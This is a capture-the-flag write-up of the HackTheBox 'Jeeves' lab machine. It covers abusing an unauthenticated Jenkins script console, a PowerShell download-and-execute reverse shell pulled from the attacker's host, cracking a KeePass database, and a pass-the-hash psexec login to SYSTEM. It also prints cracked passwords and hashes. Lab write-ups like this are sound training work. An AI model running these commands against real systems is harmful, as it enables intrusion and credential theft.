---
layout: post
title: "HTB: JEEVES (10.10.10.63)"
description: "I will begin by targeting a web server and identifying a Jenkins instance that lacks authentication. This Jenkins misconfiguration can be exploited to gain execution privileges and establish a remote shell connection. Once I have access, I will search for a KeePass database, extract a hash, and leverage it to gain administrative privileges. It's worth noting that the root.txt file is hidden within an alternative data stream."
tags: [Jenkins, Jeeves, HTB, HackTheBox, Nishang, Script console, Groovey, pass the hash, password spray, crackmapexec, psexec, gobuster, Alternate Data Stream, keepass, keepass2john, hashcat, password cracking]
image: "/assets/img/jeeves/feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

```sh
┌─[george@parrot]─[~/HTB/jeeves]
└──╼ $ sudo nmap -p- --min-rate 10000 -oA nmap/allports 10.10.10.63
[sudo] password for george:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-30 14:28 EAT
Nmap scan report for 10.10.10.63
Host is up (0.29s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 14.67 seconds
┌─[george@parrot]─[~/HTB/jeeves]
└──╼ $ sudo nmap -sC -sV -p80,135,445,50000 -oA nmap/jeeves 10.10.10.63
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-30 14:29 EAT
Nmap scan report for 10.10.10.63
Host is up (0.33s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m41s, deviation: 0s, median: 5h00m41s
| smb2-time:
|   date: 2023-09-30T16:30:38
|_  start_date: 2023-09-30T10:29:28
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.21 seconds
```

`nmap` is not sure about the host os version as it gives `Windows 7 - 10`

### Port enumeration
#### Port 80(http)

Visiting the site we get a search engine with a bunch of dead links

![Index](/assets/img/jeeves/jeeves_index.png)

The search button takes me to an error page which i very misleading (probably a rabbit hole) reason being it is an image and not the actual error page so I will avoid it.

![RABBIT HOLE](/assets/img/jeeves/sql_error.png)

#### Port 445(SMB)

I am unable to connect to SMB without any credentials.

```sh
┌─[george@parrot]─[~/HTB/jeeves]
└──╼ $ smbclient -N -L //10.10.10.63
session setup failed: NT_STATUS_ACCESS_DENIED
┌─[✗]─[george@parrot]─[~/HTB/jeeves]
```
#### Port 50000(http)

Visiting this page I get a `404` error with a link to a  `jetty` site which is a java based webserver.

#### Directory bruteforce using Gobuster

`gobuster` finds one directory

```sh
┌─[george@parrot]─[~/HTB/jeeves]
└──╼ $ gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.63:50000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/09/30 15:03:38 Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]
```
When I visit the page, I get a `Jenkins` database which seems is already authenticated despite it asking for login details

![Jenkins](/assets/img/jeeves/jenkins.png)

## Shell as kohsuke
### Jenkins

WTH is Jenkins? Googling around I found this simple explanation

`Jenkins` is a self-contained, open source automation server build on `Java` which can be used to automate all sorts of tasks related to building, testing, and delivering or deploying software.

Further research on how to exploit it, I got this nice [Article](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6) That details the process of using the `Groovy Script Console` Which allows anyone to run arbitrary Groovy scripts inside the Jenkins master runtime

#### Jenkins Groovy Script Console

Jenkins features a nice Groovy script console which allows one to run arbitrary Groovy scripts within the Jenkins master runtime or in the runtime on agents. It is a web-based Groovy shell into the Jenkins runtime. Groovy is a very powerful language which offers the ability to do practically anything Java can do including :

- Create sub-processes and execute arbitrary commands on the Jenkins master and agents
- It can even read files in which the Jenkins master has access to on the host (like /etc/passwd)
- Decrypt credentials configured within Jenkins
- Granting a normal Jenkins user Script Console Access is essentially the same as giving them Administrator rights within Jenkins

To access the `Script Console` we will navigate to `Manage Jenkins`->`Script Console`.

![Script Console](/assets/img/jeeves/script_console.png)

### RCE

I will run a simple `whoami` command to see if we truly have code execution

![RCE Testing](/assets/img/jeeves/testing_rce.png)

And its a success. Now the next step is to get access on the box, for this I will use `nishang`

First I will add my `shell.ps1` to the `www` folder reason being I dont like exposing my entire directory to the web bad things can happen.

Then I will host a simple http server using `python3` and wait for a connection on my other terminal running a `netcat` listener.

![Netcat](/assets/img/jeeves/nc.png)

On Jeeves I will execute below command to download the file and execute it using below powershell command

```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7:80/shell.ps1')"
```
![Rev shell](/assets/img/jeeves/rev.png)

We see `jeeves` grabbing the file

```sh
┌─[george@parrot]─[~/HTB/jeeves/www]
└──╼ $ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.63 - - [01/Oct/2023 04:57:50] "GET /shell.ps1 HTTP/1.1" 200 -
```
And a second later we have shell on the box as `kohsuke` who happens to be the creator of `jenkins`.

```sh
┌─[george@parrot]─[~/HTB/jeeves/www]
└──╼ $ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.63] 49677
Windows PowerShell running as user kohsuke on JEEVES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\.jenkins>
PS C:\Users\Administrator\.jenkins> whoami
jeeves\kohsuke
```
## Shell as NT AUTHORITY\SYSTEM
### Enumeration

In the `Documents` directory, I find a single file which is a [KeePass](https://keepass.info/) database.

I will copy this to my box using `impacket-smbserver`.

I will create a share called `george` in my current working directory

```sh
┌─[✗]─[george@parrot]─[~/HTB/jeeves/www]
└──╼ $ sudo impacket-smbserver george $(pwd)
[sudo] password for george:
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
On the `Jeeves` box I will connect to my share using below `PowerShell` command

```lua
PS C:\Users\kohsuke\documents> New-PSDrive -Name "gee" -PSProvider "FileSystem" -Root "\\10.10.16.7\george"

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
gee                                    FileSystem    \\10.10.16.7\george                                               


PS C:\Users\kohsuke\documents>
```
And we are Connected

```sh
┌─[✗]─[george@parrot]─[~/HTB/jeeves/www]
└──╼ $
=====================snip======================================
[*] Incoming connection (10.10.10.63,49681)
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)
[*] User JEEVES\kohsuke authenticated successfully
[*] kohsuke::JEEVES:aaaaaaaaaaaaaaaa:8f12d4d120db95be6bb16de8dbe0ed90:01010000000000008071142910f4d901e02849cc377fdc6400000000010010006100460064004100610070004c007100030010006100460064004100610070004c00710002001000700053004100480041006a006200610004001000700053004100480041006a0062006100070008008071142910f4d90106000400020000000800300030000000000000000000000000300000880753dd00bb66b827bd8285bc20c788fb2d5a22718e578603f93fed5bdd4a2a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003700000000000000000000000000
[*] Disconnecting Share(1:GEORGE)
[*] Closing down connection (10.10.10.63,49681)
[*] Remaining connections []
```
I will now switch directories and copy that `KeePass` database here

```sh
PS C:\Users\kohsuke\documents> cd gee:
PS gee:\> cp C:\users\kohsuke\documents\CEH.kdbx .
PS gee:\>
```
### Password cracking

Using `keepass2john` I will convert it into a hash and crack it

```sh
─[george@parrot]─[~/HTB/jeeves/www]
└──╼ $ keepass2john CEH.kdbx
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```
And it cracks, passwword is `moonshine1`

```sh
┌─[✗]─[george@parrot]─[~/HTB/jeeves/www]
└──╼ $ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

=============snip===================
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089
b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1

Session..........: hashcat
Status...........: Cracked
Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea...47db48
Time.Started.....: Sun Oct  1 06:00:47 2023 (3 mins, 14 secs)
Time.Estimated...: Sun Oct  1 06:04:01 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      286 H/s (16.31ms) @ Accel:256 Loops:32 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 55296/14344385 (0.39%)
Rejected.........: 0/55296 (0.00%)
Restore.Point....: 54272/14344385 (0.38%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:5984-6000
Candidates.#1....: 250895 -> grad2010

Started: Sun Oct  1 06:00:21 2023
Stopped: Sun Oct  1 06:04:04 2023

```

### Accessing KeePass database

I will use the `kpcli` to extract passwords from the database. If you dont have it you can install by issuing ` sudo apt install kpcli`

```sh
┌─[george@parrot]─[~/HTB/jeeves/www]
└──╼ $ kpcli --kdb CEH.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>
```
Lets show everything on the database.

```sh
kpcli:/> find .
Searching for "." ...
 - 8 matches found and placed into /_found/
Would you like to list them now? [y/N]
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
```
I will grab all the passwords using `show -f {number}`.

### Password spraying

```sh
kpcli:/> show -f 0          

 Path: /CEH/
Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL:                    
Notes:    

kpcli:/> show -f 1

 Path: /CEH/
Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes:         
kpcli:/> show -f 2           

 Path: /CEH/
Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL:
Notes:  
kpcli:/> show -f 3

 Path: /CEH/
Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/> show -f 4

 Path: /CEH/
Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes:

kpcli:/> show -f 5

 Path: /CEH/
Title: Jenkins admin
Uname: admin
 Pass:
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable!

kpcli:/> show -f 6

 Path: /CEH/
Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL:
Notes:

kpcli:/> show -f 7

 Path: /CEH/
Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on
```
Back on the box we saw only two users, we already have access to `kohsuke` now we need to access `Administrator`.

Password spraying failed. None of the passwords worked

```sh
┌─[george@parrot]─[~/HTB/jeeves]
└──╼ $ crackmapexec smb 10.10.10.63 -u Administrator -p pass.txt
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:Password STATUS_LOGON_FAILURE
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:pwndyouall! STATUS_LOGON_FAILURE
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:12345 STATUS_LOGON_
```

### Pass the hash

The very first entry had a hash which looks like `NTLM` Hash

```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

The first part is the `LANMAN` or simply `LM` which is an empty string denoted by the [aad3b435b51404eeaad3b435b51404ee](https://yougottahackthat.com/blog/339/what-is-aad3b435b51404eeaad3b435b51404ee).

The second part is the `nt` hash

I will attempt to authenticate using the ntlm hash.

Eureka!!!

```
┌─[george@parrot]─[~/HTB/jeeves]
└──╼ $ crackmapexec smb 10.10.10.63 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'                                                                                                    
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```

### SHell on the box

I will use `psexec` to get shell on the box

```sh
┌─[george@parrot]─[~/HTB/jeeves]
└──╼ $ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file iNePtify.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service tIPY on 10.10.10.63.....
[*] Starting service tIPY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### Root Flag

The root flag had a twist to it. When you list content of the administrator desktop(where we expect it to be) we find `hm.txt`

```sh
C:\Windows\system32> cd c:\users\administrator\desktop

c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,613,374,976 bytes free

c:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```
Googling around, I discovered sometimes there are other data streams. We can verify by issuing the command `dir /R`

```sh
c:\Users\Administrator\Desktop> dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,613,374,976 bytes free

```

And there it is.

#### What is a data stream

In the context of computer file systems, a data stream refers to a sequence of data associated with a file. It can be thought of as a stream or flow of data within a file. Data streams are commonly used in file systems to manage and store various types of information within a single file. The two primary types of data streams in the Windows NTFS file system are:

- **Main Data Stream**: This is the primary data associated with a file. When you open and read a file, you're typically interacting with its main data stream. It contains the content and information you expect from the file.

- **Alternate Data Streams (ADS)**: These are additional data streams that can be associated with a file. Each file can have multiple alternate data streams, each with its own name and content. These streams are often used for metadata, extended attributes, or other hidden or less-visible information associated with a file.

back to our box, we can view this by using the `more < hm.txt:root.txt` command.

```sh
c:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4b615a60648*************

c:\Users\Administrator\Desktop>
```

or Using pwershell

```sh
c:\Users\Administrator\Desktop> powershell (Get-Content hm.txt -Stream root.txt)
afbc5bd4b615a60648*************
```

And thats the box. Thank you all for taking your time to read my blog post, stay tuned for the next!

Happy hacking!
